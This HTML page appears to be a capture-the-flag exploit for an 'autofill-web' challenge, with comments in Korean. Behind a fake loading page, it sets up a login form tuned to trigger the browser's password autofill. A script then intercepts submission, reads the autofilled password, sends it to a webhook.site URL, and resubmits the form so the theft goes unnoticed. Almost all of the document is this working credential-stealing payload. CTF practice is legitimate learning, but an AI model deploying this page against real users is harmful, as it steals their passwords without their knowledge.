<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <h1>Please wait, loading configuration...</h1>

    <!-- 1. autocomplete 속성을 추가하여 브라우저를 완벽하게 속이는 폼 -->
    <form id="login-form" action="https://autofill-web.k17.kctf.cloud/login" method="POST">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" value="admin" autocomplete="username">
        <br>
        <label for="password">Password:</label>
        <!-- (핵심) autocomplete="current-password" 추가 -->
        <input type="password" id="password" name="password" autocomplete="current-password">
        <br>
        <input type="submit" value="Sign In">
    </form>

    <script>
        // (중요) 이 URL을 당신의 Webhook.site URL로 반드시 교체하세요!
        const webhookUrl = '	https://webhook.site/4cea2e4b-cd66-4c12-adf3-a0a0fc51ffe3';
        const form = document.getElementById('login-form');

        // 2. (핵심) 타이머 대신 form의 'submit' 이벤트를 감지
        form.addEventListener('submit', (event) => {
            // 폼이 실제로 제출되어 페이지가 넘어가는 것을 일단 막습니다.
            event.preventDefault();

            const stolenPassword = document.getElementById('password').value;

            if (stolenPassword) {
                console.log("Password stolen on submit:", stolenPassword);
                // 훔친 비밀번호를 Webhook으로 전송
                fetch(`${webhookUrl}?password=${encodeURIComponent(stolenPassword)}`)
                  .then(() => {
                    // 전송 후, 원래대로 폼을 제출하여 자연스럽게 보이게 할 수 있습니다.
                    form.submit();
                  });
            } else {
                console.log("Submit triggered, but password field is empty.");
                fetch(`${webhookUrl}?error=autofill_failed_on_submit`);
            }
        });
    </script>
</body>
</html>
